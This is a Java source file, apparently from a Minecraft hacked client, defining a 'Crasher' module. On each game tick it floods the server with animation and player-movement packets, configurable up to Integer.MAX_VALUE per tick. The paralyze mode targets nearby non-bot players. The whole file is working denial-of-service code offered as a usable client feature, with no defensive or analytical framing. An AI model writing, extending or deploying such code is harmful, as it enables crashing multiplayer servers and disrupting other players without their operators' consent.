package io.github.alerithe.client.features.modules.impl.miscellaneous;

import io.github.alerithe.client.events.EventTick;
import io.github.alerithe.client.features.modules.Module;
import io.github.alerithe.client.features.modules.impl.combat.AntiBot;
import io.github.alerithe.client.features.properties.impl.BooleanProperty;
import io.github.alerithe.client.features.properties.impl.IntProperty;
import io.github.alerithe.client.utilities.Wrapper;
import io.github.alerithe.events.Register;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;

public class Crasher extends Module {
    private final BooleanProperty boxer = new BooleanProperty("Boxer", new String[0], true);
    private final IntProperty bpt = new IntProperty("BoxersPerTick", new String[]{"bpt"}, 100, 1, Integer.MAX_VALUE);
    private final BooleanProperty paralyze = new BooleanProperty("Paralyze", new String[0], true);
    private final IntProperty ppt = new IntProperty("ParaPerTick", new String[]{"ppt"}, 100, 1, Integer.MAX_VALUE);

    public Crasher() {
        super("Crasher", new String[0], Type.MISCELLANEOUS);

        getPropertyManager().add(boxer);
        getPropertyManager().add(bpt);
        getPropertyManager().add(paralyze);
        getPropertyManager().add(ppt);
    }

    @Register
    private void onTick(EventTick event) {
        if (!event.isInGame()) return;

        sendBoxerCrash();
        sendParalyzeCrash();
    }

    private void sendBoxerCrash() {
        if (!boxer.getValue()) return;

        for (int i = 0; i < bpt.getValue(); i++) {
            Wrapper.sendPacket(new C0APacketAnimation());
        }
    }

    private void sendParalyzeCrash() {
        if (!paralyze.getValue()) return;
        if (!Wrapper.getPlayer().onGround) return;

        for (EntityPlayer player : Wrapper.getWorld().playerEntities) {
            if (AntiBot.isBot(player)) continue;
            if (player.equals(Wrapper.getPlayer())) continue;
            if (Wrapper.getPlayer().getDistanceSqToEntity(player) > 1) continue;

            for (int i = 0; i < ppt.getValue(); i++) {
                Wrapper.sendPacket(new C03PacketPlayer(true));
            }

            break;
        }
    }
}
